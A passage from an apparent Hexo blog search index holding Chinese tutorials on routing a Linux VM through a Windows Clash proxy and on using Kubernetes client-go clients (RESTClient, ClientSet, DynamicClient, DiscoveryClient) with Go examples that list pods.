    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】linux中使用windows的clash</title>
    <link href="/2022/08/14/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91linux%E4%B8%AD%E4%BD%BF%E7%94%A8windows%E7%9A%84clash/"/>
    <url>/2022/08/14/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91linux%E4%B8%AD%E4%BD%BF%E7%94%A8windows%E7%9A%84clash/</url>
    
    <content type="html"><![CDATA[<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>clash运行在windows下</p><p>虚拟机是vmware的nat网络模式，所以使用的是vm8网卡</p><p>虚拟机的ip：192.168.56.168</p><p>虚拟机的网关：192.168.56.2</p><p>windows下vm8网卡的ip：192.168.56.1</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814164916886.png" alt="image-20220814164916886"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814171028887.png" alt="image-20220814171028887"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170848227.png" alt="image-20220814170848227"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814171119246.png" alt="image-20220814171119246"></p><h2 id="操作部署"><a href="#操作部署" class="headerlink" title="操作部署"></a>操作部署</h2><h3 id="1）clash打开”允许局域网连接”"><a href="#1）clash打开”允许局域网连接”" class="headerlink" title="1）clash打开”允许局域网连接”"></a>1）clash打开”允许局域网连接”</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814165037015.png" alt="image-20220814165037015"></p><p>鼠标放到”允许局域网连接“的地方，可以看到vm8的ip</p><p>这个ip是windows中vm8的网卡ip</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814165150900.png" alt="image-20220814165150900"></p><h3 id="2）windows关闭防火墙或者开放7890端口"><a href="#2）windows关闭防火墙或者开放7890端口" class="headerlink" title="2）windows关闭防火墙或者开放7890端口"></a>2）windows关闭防火墙或者开放7890端口</h3><p>打开控制面板<br>选择windows 防火墙<br>点击左侧的“高级设置”选项<br>设置入站规则<br>点击“新建规则”，点选“端口”，单击 “下一步”（注意：入站规则是指别人电脑访问自己电脑；出站规则实质自己电脑访问别人电脑）</p><p>选择相应的协议（例如：添加7890端口，选择TCP；特定本地端口处输入7890；）<br>选择“允许连接”，点击“下一步”；<br>勾选“域”，“专用”，“公司”，点击“下一步”<br>输入端口名称，点“完成”即可</p><h3 id="3）linux机器上配置代理地址及端口"><a href="#3）linux机器上配置代理地址及端口" class="headerlink" title="3）linux机器上配置代理地址及端口"></a>3）linux机器上配置代理地址及端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br><br>添加如下内容：<br><span class="hljs-built_in">export</span> http_proxy=http://192.168.56.1:7890<br><span class="hljs-built_in">export</span> https_proxy=http://192.168.56.1:7890<br><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><h3 id="4）测试"><a href="#4）测试" class="headerlink" title="4）测试"></a>4）测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试7890端口是否通</span><br>telnet 192.168.56.1 7890<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170200958.png" alt="image-20220814170200958"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试能否成功访问google</span><br>curl www.google.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170442788.png" alt="image-20220814170442788"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/lyy-blog/p/14923024.html"><a href="https://www.cnblogs.com/lyy-blog/p/14923024.html">linux添加代理到clash for windows代理</a></a></p><p><a href="https://blog.csdn.net/nihaize0520/article/details/80714108">Win10 开放防火墙中某一端口</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202208) client-go学习与实践</title>
    <link href="/2022/08/09/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202208)%20client-go%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/08/09/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202208)%20client-go%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h2 id="client-go客户端对象"><a href="#client-go客户端对象" class="headerlink" title="client-go客户端对象"></a>client-go客户端对象</h2><p>client-go支持RESTClient、ClientSet、DynamicClient、DiscoveryClient四种客户端与Kubernetes Api Server进行交互。</p><ul><li><p>RESTClient：最基础的客户端，主要是对HTTP请求进行了封装，支持Json和Protobuf格式的数据。</p></li><li><p>DiscoveryClient：发现客户端，负责发现APIServer支持的资源组、资源版本和资源信息的(GVR)。</p></li><li><p>ClientSet：负责操作Kubernetes内置的资源对象，例如：Pod、Services等。</p></li><li><p>DynamicClient：动态客户端，可以对任意的Kubernetes资源对象进行通用操作，包括CRD。</p></li></ul><h2 id="client-go-demo-工程初始化"><a href="#client-go-demo-工程初始化" class="headerlink" title="client-go-demo 工程初始化"></a>client-go-demo 工程初始化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master ~]<span class="hljs-comment"># mkdir client-go-demo</span><br>[root@master ~]<span class="hljs-comment">#</span><br>[root@master ~]<span class="hljs-comment">#</span><br>[root@master ~]<span class="hljs-comment"># cd client-go-demo/</span><br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># ll</span><br>总用量 0<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># go mod init ningan.com/client-go-demo</span><br>go: creating new go.mod: module ningan.com/client-go-demo<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># ll</span><br>总用量 4<br>-rw-r--r-- 1 root root 42 8月   9 04:06 go.mod<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># cat go.mod</span><br>module ningan.com/client-go-demo<br><br>go 1.17<br><br></code></pre></td></tr></table></figure><h2 id="RESTClient"><a href="#RESTClient" class="headerlink" title="RESTClient"></a>RESTClient</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>RESTClient是最基础的客户端，其他的ClientSet、DynamicClient即DscoveryClient都是基于RESTClient实现的。</p><p>RESTClient对HTTP Client进行了封装，实现了Restful风格的API。</p><p>它具有很高的灵活性，数据不依赖于方法和资源，因此RESTClient能够处理多种类型的调用，返回不同的数据格式。</p><p>demo示例：通过RESTClient示例列出某一命名空间下的Pod资源对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>corev1 <span class="hljs-string">&quot;k8s.io/api/core/v1&quot;</span><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/kubernetes/scheme&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/rest&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: 获取kube-system命名空间下的Pod列表</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1. k8s的配置文件</span><br><span class="hljs-comment">2. 保证开发机能通过这个配置文件连接到k8s集群</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 1. 加载配置文件，生成config对象</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br><span class="hljs-comment">// panic(err.Error())</span><br>&#125;<br><br><span class="hljs-comment">// 2. 配置API路径  请求的HTTP路径</span><br>config.APIPath = <span class="hljs-string">&quot;api&quot;</span> <span class="hljs-comment">// pods,  /api/v1/pods</span><br><span class="hljs-comment">// config.APIPath = &quot;apis&quot; // deployments,  /apis/apps/v1/namespaces/&#123;namespace&#125;/deployments/&#123;deployment&#125;</span><br><br><span class="hljs-comment">// 3. 配置请求的资源组/资源版本 GV</span><br>config.GroupVersion = &amp;corev1.SchemeGroupVersion <span class="hljs-comment">// 无名资源组, group: &quot; &quot;, version: &quot;v1&quot;</span><br><br><span class="hljs-comment">// 4. 配置数据的编解码工具  序列化和反序列化</span><br>config.NegotiatedSerializer = scheme.Codecs<br><br><span class="hljs-comment">// 5. 通过kubeconfg配置信息实例化RESTClient对象</span><br>restClient, err := rest.RESTClientFor(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><br><span class="hljs-comment">// 6. 定义接收返回值的变量</span><br>result := &amp;corev1.PodList&#123;&#125;<br><br><span class="hljs-comment">// 跟APIServer交互</span><br>err = restClient.<br>Get().                                                                  <span class="hljs-comment">// RESTClient对象构建HTTP请求参数  请求方法：Get、Post、Put、Delete、Patch</span><br>Namespace(<span class="hljs-string">&quot;kube-system&quot;</span>).                                               <span class="hljs-comment">// 命名空间</span><br>Resource(<span class="hljs-string">&quot;pods&quot;</span>).                                                       <span class="hljs-comment">// 资源名</span><br>VersionedParams(&amp;metav1.ListOptions&#123;Limit: <span class="hljs-number">50</span>&#125;, scheme.ParameterCodec). <span class="hljs-comment">// 将一些查询选项(如limit、TimeoutSeconds)添加到请求参数中 limit参数表示最多检索出多少信息</span><br>Do(context.TODO()).                                                     <span class="hljs-comment">// 执行该请求</span><br>Into(result)                                                            <span class="hljs-comment">// 将kube-apiserver返回的结果（Result对象）解析到corev1.PodList对象中</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1）Get定义请求方式，返回了一个Request结构体对象。这个Request结构体对象，就是构建访问APIServer用的。</span><br><span class="hljs-comment">2）依次执行了Namespace、Resource、VersionedParams，构建与APIServer交互的参数。</span><br><span class="hljs-comment">3）Do方法通过requets发起请求，然后通过transformResponse解析请求返回，并绑定到对应资源对象的结构体对象上。这里的话，表示的是corev1.PodList对象。</span><br><span class="hljs-comment">4）request先是检查了有没有可用的client，在这里开始调用net/http包的功能。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) RESTClient发送请求的过程对Go语言标准库net/http进行了封装，由Do -&gt; Request函数实现。</span><br><span class="hljs-comment">2) 请求发送之前需要根据请求参数生成请求的RESTful URL，由r.URL().String()函数完成。 http://xxxx:x/api/v1/namespaces/kube-system/pods?limit=1</span><br><span class="hljs-comment">3) 通过Go语言标准库net/http向RESTful URL(即kube-apiserver)发送请求，请求得到的结果存放在http.Response的Body对象中，fn函数（即transformResponse）将结果转化为资源对象。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 格式化输出结果</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> result.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo1]<span class="hljs-comment"># go run main.go</span><br>namespace: kube-system, name: calico-kube-controllers-67878b879f-2x5xg, status: Running<br>namespace: kube-system, name: calico-node-4xwrz, status: Running<br>namespace: kube-system, name: metrics-server-68955dc6f-xvv9t, status: Running<br></code></pre></td></tr></table></figure><h2 id="ClientSet"><a href="#ClientSet" class="headerlink" title="ClientSet"></a>ClientSet</h2><p>RESTClient是一种最基础的客户端，使用时需要指定Resource和Version等信息，编写代码需要提前知道Resource所在的Group和对应的Version信息。</p><p>相比RESTClient，ClientSet使用起来更加便捷，一般情况下，开发者对Kubernetes进行二次开发时通常使用ClientSet。</p><p>ClientSet在RESTClient的基础上封装了对Resource和Version的管理方法。每一个Resource可以理解为一个客户端，而ClientSet则是多个客户端的集合，每一个Resource和Version都以函数的方法暴露给开发者，例如ClientSet提供的RbacV1、CoreV1、NetworkingV1等接口参数。</p><p>demo示例：通过ClientSet示例列出某一命名空间下的Pod资源对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/kubernetes&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: 获取kube-system命名空间下的Pod列表</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. 加载配置文件，生成config对象</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. 通过kubeconfig配置信息实例化ClientSet 该对象用于管理所有Resource的客户端</span><br>clientset, err := kubernetes.NewForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. 查询</span><br>result, err := clientset.<br>CoreV1().            <span class="hljs-comment">// 返回CoreV1Client实例</span><br>Pods(<span class="hljs-string">&quot;kube-system&quot;</span>). <span class="hljs-comment">// 指定查询的资源预计指定资源的namespace，namespace如果为空，表示查询所有namespace</span><br><span class="hljs-comment">// Namespaces().     // 查询namespace</span><br>List(context.TODO(), metav1.ListOptions&#123;Limit: <span class="hljs-number">50</span>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) CoreV1返回CoreV1Client实例对象</span><br><span class="hljs-comment">2) Pods 调用了newPods函数，该函数返回的试PodInterface对象，PodInterface对象实现了Pods资源相关的全部方法，同时再newPods里面还将RESTClient实例对象赋值给了对应的Client属性</span><br><span class="hljs-comment">3) List内部使用RestClient与k8s APIServer进行了交互</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) clientset.CoreV1().Pods表示请求core核心资源组的v1资源版本下的Pod资源对象，其内部设置了APIPath请求的HTTP路径，GroupVersion请求的资源组、资源版本，NegotiatedSerializer数据的编解码器。</span><br><span class="hljs-comment">2) Pods函数是一个资源对象接口，用于Pod资源对象的管理。例如，对Pod资源执行Create、Update、Delete、Get、List、Watch、Patch等操作，这些操作实际上是对RESTClient进行了封装，可以设置选项（如Limit、TimeoutSeconds等）。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 4. 格式化输出结果</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> result.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="DynamicClient"><a href="#DynamicClient" class="headerlink" title="DynamicClient"></a>DynamicClient</h2><p>DynamicClient是一种动态客户端，它可以对任意Kubernetes资源进行RESTFul操作，包括CRD自定义资源。</p><p>DynamicClient与ClientSet操作类似，同样封装了RESTClient，同样提供了Create、Update、Delete、Get、List、Watch、Patch等方法。</p><p>DynamicClient与ClientSet最大的不同之处在于：</p><ul><li><p>ClientSet仅能访问Kubernetes自带的资源（即客户端几核内的资源），不能直接访问CRD自定义资源。ClientSet需要预先实现每种Resource和Version的操作，其内部的数据都是结构化数据（即已知数据结构）</p></li><li><p>DynamicClient内部实现了Unstructured，用于处理非结构化数据结构（即无法提前预知数据结构），这也是DynamicClient能够处理CRD自定义资源的关键。</p></li></ul><p>DynamicClient的处理过程将Resource（例如PodList）转化成Unstructured结构类型，Kubernetes的所有Resource都可以转化为该结构类型。处理完成后，再将Unstructured转换成PodList。整个过程类似于Go语言的interface{}断言转换过程。另外，Unstructured结构类型是通过map[string]interface{}转换的。</p><p>两个重要的知识点：</p><ul><li>Object.runtime：Kubernetes中的所有资源对象都实现了这个接口，其中包含DeepCopyObject和GetObjectKind的方法，分别用于对象深拷贝和获取对象的具体资源类型。</li><li>Unstructured：包含map[string]interface{}类型字段，在处理无法预知结构的数据时，将数据值存入interface{}中，待运行时利用反射判断。该结构体提供了大量的工具方法，便于处理非结构化的数据。</li></ul><p>demo示例：通过DynamicClient示例列出某一命名空间下的Pod资源对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>corev1 <span class="hljs-string">&quot;k8s.io/api/core/v1&quot;</span><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime&quot;</span><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/dynamic&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: 获取kube-system命名空间下的Pod列表</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. 加载配置文件，生成config对象</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. 通过kubeconfig配置信息实例化客户端对象，这里是实例化动态客户端对象。该对象用于管理Kubernetes的所有Resource的客户端，例如对Resource执行Create、Update、Delete、Get、List、Watch、Patch等操作。</span><br>dynamicClient, err := dynamic.NewForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. 配置需要调用的GVR</span><br>gvr := schema.GroupVersionResource&#123;<br>Group:    <span class="hljs-string">&quot;&quot;</span>,<br>Version:  <span class="hljs-string">&quot;v1&quot;</span>,<br>Resource: <span class="hljs-string">&quot;pods&quot;</span>,<br>&#125;<br><br><span class="hljs-comment">// 4. 发送请求，并得到返回结果</span><br>unstructedObj, err := dynamicClient.<br>Resource(gvr).<br>Namespace(<span class="hljs-string">&quot;kube-system&quot;</span>).<br>List(context.TODO(), metav1.ListOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 5. unstructedObj转化为结构化数据</span><br>podList := &amp;corev1.PodList&#123;&#125;<br>err = runtime.DefaultUnstructuredConverter.FromUnstructured(<br>unstructedObj.UnstructuredContent(),<br>podList,<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) Resource：基于gvr生成了一个针对于资源的客户端，也可以称之为动态资源客户端，dynamicResourceClient</span><br><span class="hljs-comment">2) Namespace：指定一个可操作的命名空间，同时它是dynamicResourceClient的方法</span><br><span class="hljs-comment">3) List：首先通过RESTClient调用k8s APIServer的接口返回了Pod的数据，返回的数据格式是二进制的Json格式，然后通过一些列的解析方法，转换成unstructured.UnstructuredList</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) dynamicClient.Resource()函数用于设置请求的资源组、资源版本、资源名称。</span><br><span class="hljs-comment">2) Namespace函数用于设置请求的命名空间。</span><br><span class="hljs-comment">3) List函数用户获取Pod列表，得到的Pod列表为unstructured.UnstructuredList指针类型</span><br><span class="hljs-comment">4) 然后通过runtime.DefaultUnstructuredConverter.FromUnstructured函数将unstructured.UnstructuredList转换为PodList类型。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 6. 格式化输出结果</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> podList.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="DiscoveryClient"><a href="#DiscoveryClient" class="headerlink" title="DiscoveryClient"></a>DiscoveryClient</h2><p>DiscoveryClient是发现客户端，它主要用于发现Kubernetes API Server所支持的资源组、资源版本、资源信息。</p><p>Kubernetes API Server支持很多资源组、资源版本、资源信息，开发者可以通过DiscoveryClient进行查看。</p><p>kuectlde api-versions和api-resources命令输出也是通过DiscoveryClient实现的。另外，DiscoveryClient也是子啊RESTClient的基础上进行了封装。</p><p>DiscoveryClient除了可以发现Kubernetes API Server所支持的资源组、资源版本、资源信息，还可以将这些信息存储到本地，用于本地缓存（cache），以减轻对Kubernetes API Server访问的压力。在运行Kubernetes组件的机器上，缓存信息默认存储与<del>&#x2F;.kube&#x2F;cache和</del>&#x2F;.kube&#x2F;http-cache下。</p><p>demo示例：通过DynamicClient列出Kubernetes API Server所支持的资源组、资源版本、资源信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 